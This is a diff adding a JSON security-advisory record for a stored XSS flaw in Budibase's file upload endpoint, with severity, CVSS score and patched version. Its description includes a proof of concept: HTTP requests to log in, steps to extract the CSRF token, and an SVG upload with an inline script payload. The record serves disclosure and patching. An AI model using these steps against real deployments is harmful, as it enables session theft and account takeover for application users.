@@ -1,0 +1,53 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-05-19T16:31:33Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "budibase"
+  },
+  "Advisory": {
+    "DatabaseId": 356797,
+    "Id": "GSA_kwCzR0hTQS04MnJjLWd4cmctdjRnZs4ABXG9",
+    "GhsaId": "GHSA-82rc-gxrg-v4gf",
+    "References": [
+      {
+        "Url": "https://github.com/Budibase/budibase/security/advisories/GHSA-82rc-gxrg-v4gf"
+      },
+      {
+        "Url": "https://github.com/Budibase/budibase/releases/tag/3.38.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-82rc-gxrg-v4gf"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-82rc-gxrg-v4gf"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-46426"
+      }
+    ],
+    "Description": "### Summary\nThe file upload endpoint `POST /api/attachments/process` does not enforce active-content restrictions for authenticated users. The checks for dangerous file extensions (`html`, `svg`, `js`, `php`, etc.) are conditionally wrapped inside `if (isPublicUser)` or `if (isPublicUser || !env.SELF_HOSTED)`, meaning any authenticated builder can upload executable web content — SVG files with inline `\u003cscript\u003e` tags, HTML pages with JavaScript, `.js` modules — which are then stored in the object store (MinIO/S3) with their correct MIME types (`image/svg+xml`, `text/html`, `application/javascript`). When the resulting signed URL is opened by any app user, the browser executes the payload.\n\nImpact is **persistent stored XSS** over all application end users.\n\n### Details\nThe vulnerability exists in a single handler function uploadFile shared by two routes, located in packages/server/src/api/controllers/static/index.ts (lines 93–179).\n\nRoute definitions (packages/server/src/api/routes/static.ts):\n\nPOST /api/attachments/process              → authorized(BUILDER)\nPOST /api/attachments/:tableId/upload      → authorized(PermissionType.TABLE, PermissionLevel.WRITE)\nBoth routes invoke the same uploadFile function. The second endpoint is accessible to any authenticated app user (BASIC or POWER role) who has been granted WRITE on any table — not just builders.\n\n### PoC\n\n### Prerequisites\n\n- Budibase self-hosted Docker deployment, any version ≤ 3.30.6\n- An account with Builder role (does **not** require admin)\n- Target app published and accessible to end users\n\n### Step 1 — Authenticate as builder\n\n```http\nPOST /api/global/auth/default/login HTTP/1.1\nHost: target:10000\nContent-Type: application/json\n\n{\"username\":\"builder@company.com\",\"password\":\"BuilderPass1!\"}\n```\n\n```\nHTTP/1.1 200 OK\nSet-Cookie: budibase:auth=\u003cjwt\u003e; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT\nSet-Cookie: budibase:auth.sig=\u003csig\u003e; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT\n\n{\"message\":\"Login successful\"}\n```\n\nThe CSRF token is bound to the session. Browsers send it automatically via the Budibase\nfrontend JS. For scripted requests, decode the JWT payload (base64url second segment) to\nextract `sessionId`, then read the Redis key `session-\u003cuserId\u003e/\u003csessionId\u003e` → `csrfToken`.\n\n### Step 2 — Upload SVG with XSS payload\n\n```http\nPOST /api/attachments/process HTTP/1.1\nHost: target:10000\nCookie: budibase:auth=\u003cjwt\u003e; budibase:auth.sig=\u003csig\u003e\nx-budibase-app-id: \u003cdev_app_id\u003e\nx-csrf-token: \u003ccsrf_token\u003e\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXXXXXXXXXXXXXX\nContent-Length: 391\n\n------WebKitFormBoundaryXXXXXXXXXXXXXXXX\nContent-Disposition: form-data; name=\"file\"; filename=\"xss.svg\"\nContent-Type: image/svg+xml\n\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003c/svg\u003e\n------WebKitFormBoundaryXXXXXXXXXXXXXXXX--\n```\n\n```json\nHTTP/1.1 200 OK\n\n[{\"size\":207,\"name\":\"xss.svg\",\"url\":\"http://target:10000/files/signed/.../\u003cuuid\u003e.svg?X-Amz-...\",\"extension\":\"svg\",\"key\":\"workspace_id/attachments/\u003cuuid\u003e.svg\"}]\n```\n### Impact\n* App end users - Stored XSS on any screen containing the attachment URL. Session cookie theft → full account takeover. |\n* Builder accounts - If malicious URL is shared within the workspace (table attachment, embedded image), XSS fires in builder's session → workspace takeover. \n\n\n\u003cimg width=\"3087\" height=\"1489\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b0ee0263-85de-430e-9575-88ec91eae565\" /\u003e\n\n\n\u003cimg width=\"2100\" height=\"1016\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5133bb1e-f637-479e-952f-14b3265129b4\" /\u003e\n\n\n\n\n\n\n\n--------\nDiscovered By:\nAbdulrahman Albatel\nAbdullah Alrasheed",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-19T16:31:30Z",
+    "Severity": "HIGH",
+    "Summary": "Budibase: Unrestricted Upload of File with Dangerous Type",
+    "UpdatedAt": "2026-05-19T16:31:33Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.6,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.38.2"
+      },
+      "VulnerableVersionRange": "\u003c 3.38.2"
+    }
+  ]
+}
